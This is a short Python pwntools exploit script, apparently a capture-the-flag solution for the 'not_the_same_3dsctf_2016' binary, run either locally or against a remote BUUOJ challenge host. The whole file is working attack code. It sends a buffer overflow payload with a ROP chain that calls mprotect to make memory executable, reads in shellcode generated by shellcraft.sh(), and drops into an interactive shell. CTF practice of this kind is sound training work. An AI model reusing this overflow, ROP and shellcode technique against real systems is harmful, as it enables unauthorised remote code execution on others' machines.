import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./not_the_same_3dsctf_2016')
		elf=ELF('./not_the_same_3dsctf_2016')
		libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28768)
		elf=ELF('./not_the_same_3dsctf_2016')
		#libc=ELF('./libc.so')



	pay='a'*0x2d+p32(elf.sym['mprotect'])+p32(0x080483b8)+p32(0x080EC000)+p32(0x1000)+p32(0x7)+p32(elf.symbols['read'])+p32(0x080483b8)+p32(0)+p32(0x80EC010)+p32(0x100)+p32(0x80EC010)
	#io.recv()
	#gdb.attach(io)
	io.sendline(pay)
	sleep(0.2)
	pay=asm(shellcraft.sh())
	io.sendline(pay)
	#gdb.attach(io)
	#pause()
	io.interactive()